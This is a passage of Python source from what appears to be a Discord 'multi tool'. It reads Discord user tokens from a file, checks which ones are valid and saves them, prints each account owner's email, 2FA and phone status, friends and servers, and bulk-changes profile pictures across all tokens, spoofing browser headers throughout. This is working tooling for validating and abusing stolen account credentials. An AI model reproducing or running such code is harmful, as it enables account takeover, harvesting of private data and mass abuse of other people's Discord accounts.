    tukan = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the token you want to check?: ''')

    header = {
        "authority": "discord.com",
        "method": "POST",
        "path": "/api/v9/users/@me",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "Authorization": f"{tukan}",
        "content-length": "0",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        'referer': 'https://discord.com/channels/@me',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": useragent(),
        "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    }

    r = requests.get(url, headers=header)

    url2 = 'https://discord.com/api/v9/users/@me/relationships'
    numoffriend = 0
    t = requests.get(url2, headers=header).json()
    for id in t:
      numoffriend += 1

    numofguilds = 0
    e = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=header).json()
    for id in e:
      numofguilds += 1

    cls()
    print(Fore.RESET)
    print(f'User Id: {Fore.GREEN}{r.json()["id"]}')
    print(f'{Fore.RESET}Full Name: {Fore.GREEN}{r.json()["username"]}#{r.json()["discriminator"]}')
    print(f'{Fore.RESET}Number Of Friends + Friend Requests: {Fore.GREEN}{numoffriend}')
    print(f'{Fore.RESET}Number Of Servers: {Fore.GREEN}{numofguilds}')
    pf = r.json()["avatar"]
    id = r.json()["id"]
    pfp = f'https://cdn.discordapp.com/avatars/{id}/{pf}'

    print(f'{Fore.RESET}Profile Picture: {Fore.GREEN}{pfp}')
    if r.json()['banner'] == 'null':
        print(f'{Fore.RESET}Banner:{Fore.MAGENTA} None')
    else:
        banner = f'https://cdn.discordapp.com/banners/{r.json()["id"]}/{r.json()["banner"]}'
        print(f'{Fore.RESET}Banner: {Fore.GREEN}{banner}')
    print(f'{Fore.RESET}Bio: {Fore.GREEN}{r.json()["bio"]}')
    print(f'{Fore.RESET}Language: {Fore.GREEN}{r.json()["locale"]}')
    print(f'{Fore.RESET}Email: {Fore.GREEN}{r.json()["email"]}')
    print(f'{Fore.RESET}2fa: {Fore.GREEN}{r.json()["mfa_enabled"]}')
    print(f'{Fore.RESET}Email Verifed: {Fore.GREEN}{r.json()["verified"]}')
    if r.json()['phone'] == 'null' or 'Null' or 'None' or '':
        print(f'{Fore.RESET}Phone Verification:{Fore.MAGENTA} False')
    else:
        print(f'{Fore.RESET}Phone Verification:{Fore.GREEN} True')
    print(f'{Fore.RESET}Public Flags: {Fore.GREEN}{r.json()["public_flags"]}')

    settings = 'https://discord.com/api/v9/users/@me/settings'
    t = requests.get(settings, headers=header)
    print(f'{Fore.RESET}Custom Status: {Fore.GREEN}{t.json()["custom_status"]}')
    print(f'{Fore.RESET}Status: {Fore.GREEN}{t.json()["status"]}')

  global checker
  def checker():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Token Checker")
      print(f'''
{Fore.GREEN}
▓███████▓ ▒█████   ▀██ ▄█▀▓█████ ███▄    █      ▄████▄   ██░ ██ ▓█████ ▀██ ▄█▀▓█████ ██▀███  
▓  ██▒ ▓▒▒██▒  ██▒  ██▄█▒ ▓█   ▀ ██ ▀█   █     ▒██▀ ▀█ ▒▓██░ ██ ▓█   ▀  ██▄█▒ ▓█   ▀▓██ ▒ ██▒
▒ ▓██░ ▒░▒██░  ██▒ ▓███▄░ ▒███  ▓██  ▀█ ██▒    ▒▓█    ▄░▒██▀▀██ ▒███   ▓███▄░ ▒███  ▓██ ░▄█ ▒
░ ▓██▓ ░ ▒██   ██░ ▓██ █▄ ▒▓█  ▄▓██▒  ▐▌██▒    ▒▓▓▄ ▄██ ░▓█ ░██ ▒▓█  ▄ ▓██ █▄ ▒▓█  ▄▒██▀▀█▄  
  ▒██▒ ░ ░ ████▓▒░ ▒██▒ █▄░▒████▒██░   ▓██░    ▒ ▓███▀  ░▓█▒░██▓░▒████ ▒██▒ █▄░▒████░██▓ ▒██▒
  ▒ ░░   ░ ▒░▒░▒░  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒░   ▒ ▒     ░ ░▒ ▒    ▒ ░░▒░▒░░ ▒░  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒▓ ░▒▓░
    ░      ░ ▒ ▒░  ░ ░▒ ▒░ ░ ░  ░ ░░   ░ ▒░      ░  ▒    ▒ ░▒░ ░ ░ ░   ░ ░▒ ▒░ ░ ░    ░▒ ░ ▒░
  ░ ░    ░ ░ ░ ▒   ░ ░░ ░    ░     ░   ░ ░     ░         ░  ░░ ░   ░   ░ ░░ ░    ░     ░   ░ 
             ░ ░   ░  ░      ░           ░     ░ ░       ░  ░  ░   ░   ░  ░      ░     ░     


      ''')
      file = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}do you want to put all the valid tokens in a file?: ''')
      valid = 0
      invalid = 0

      tokens = []
      token = []

      with open('tokens.txt','r') as f:
        for line in f:
          tokens.append(line)

      for element in tokens:
        token.append(element.strip())

      length = len(token)

      if file in yeslist:
        tokenfile = open('validtokens.txt','a')
        for x in range(length):
            header = {
                "authority": "discord.com",
                "scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": f'{token[x]}',
                "content-length": "0",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                'referer': 'https://discord.com/channels/@me',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": useragent(),
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            } 
            r = requests.get('https://discordapp.com/api/v9/users/@me/library', headers = header)  
            if r.status_code == 200:
                print(f'{Fore.WHITE} [+] Valid {token[x]}' )
                valid += 1
                tokenfile.write(token[x] + '\n')
            else:
                print(f'\033[31m [-] Invalid {token[x]}', )
                invalid += 1

        print(f'{Fore.WHITE} There are {valid} valid tokens and {invalid} invalid tokens')

      elif file in nolist:
        for x in range(length):
            header = {
                "authority": "discord.com",
                "scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": f'{token[x]}',
                "content-length": "0",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                'referer': 'https://discord.com/channels/@me',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": useragent(),
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            } 
            r = requests.get('https://discordapp.com/api/v9/users/@me/library', headers = header)  
            if r.status_code == 200:
                print(f'{Fore.WHITE} [+] Valid {token[x]}' )
                valid += 1
            else:
                print(f'\033[31m [-] Invalid {token[x]}', )
                invalid += 1

        print(f'There are {valid} valid tokens and {invalid} invalid tokens')

  global pfpmanager
  def pfpmanager():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Pdp Manager")
    optionsforpfp = print(f'''
    {Fore.GREEN}
 ██▓███   ▓█████▄  ██▓███       ▄████▄   ██░ ██  ▄▄▄      ███▄    █    ▄████ ▓█████ ██▀███  
▓██░  ██  ▒██▀ ██▌▓██░  ██     ▒██▀ ▀█ ▒▓██░ ██ ▒████▄    ██ ▀█   █ ▒ ██▒ ▀█▒▓█   ▀▓██ ▒ ██▒
▓██░ ██▓▒ ░██   █▌▓██░ ██▓▒    ▒▓█    ▄░▒██▀▀██ ▒██  ▀█▄ ▓██  ▀█ ██▒░▒██░▄▄▄░▒███  ▓██ ░▄█ ▒
▒██▄█▓▒ ▒▒░▓█▄   ▌▒██▄█▓▒ ▒    ▒▓▓▄ ▄██ ░▓█ ░██ ░██▄▄▄▄██▓██▒  ▐▌██▒░░▓█  ██▓▒▓█  ▄▒██▀▀█▄  
▒██▒ ░  ░░░▒████▓ ▒██▒ ░  ░    ▒ ▓███▀  ░▓█▒░██▓ ▓█   ▓██▒██░   ▓██░░▒▓███▀▒░░▒████░██▓ ▒██▒
▒▓▒░ ░  ░░ ▒▒▓  ▒ ▒▓▒░ ░  ░    ░ ░▒ ▒    ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒░   ▒ ▒  ░▒   ▒  ░░ ▒░ ░ ▒▓ ░▒▓░
░▒ ░       ░ ▒  ▒ ░▒ ░           ░  ▒    ▒ ░▒░ ░  ░   ▒▒ ░ ░░   ░ ▒░  ░   ░   ░ ░    ░▒ ░ ▒░
░░         ░ ░  ░ ░░           ░         ░  ░░ ░  ░   ▒     ░   ░ ░ ░ ░   ░ ░   ░     ░   ░ 
             ░                 ░ ░       ░  ░  ░      ░           ░       ░     ░     ░     


    {Fore.GREEN}[{Fore.WHITE}1{Fore.GREEN}] {Fore.WHITE}ONE PDP
    {Fore.GREEN}[{Fore.WHITE}2{Fore.GREEN}] {Fore.WHITE}CUSTOM PDP
    {Fore.GREEN}[{Fore.WHITE}3{Fore.GREEN}] {Fore.WHITE}Shrek PDP

    ''')

    optionsforpfp = int(input(f"""{Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE}"""))

    if optionsforpfp == 1:
        image = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the name of the image (Make sure the image is in the same folder as Menu.py): ''')
        with open(image,'rb') as f:
            byteform = base64.b64encode(f.read())
            imageurl1 = byteform.decode('utf-8')

        payload1 = {
            'avatar':f'data:image/png;base64,{imageurl1}'
        }

    elif optionsforpfp == 2:
        path = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the directory where all the images are?: ''')
        path.replace(r'\\','\\\\')

        image1 = random.choice([
        x for x in os.listdir(path)
        if os.path.isfile(os.path.join(path, x))
    ])

        with open(image1,'rb') as e:
            byteform = base64.b64encode(e.read())
            imageurl2 = byteform.decode('utf-8')

        payload2 = {
            'avatar':f'data:image/png;base64,{imageurl2}'
        }

    elif optionsforpfp == 3:
        image = "data:image/jpeg;base64,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"

        payload3 = {
            'avatar':image
        }

    url = 'https://discord.com/api/v9/users/@me'

    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": useragent(),
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        if optionsforpfp == 1:
            r = requests.patch(url,headers=header,json=payload1)
            if r.status_code == 200:
                print(Fore.WHITE + f'Done! added pfp to {token[x]}')
            else:
                print(r)
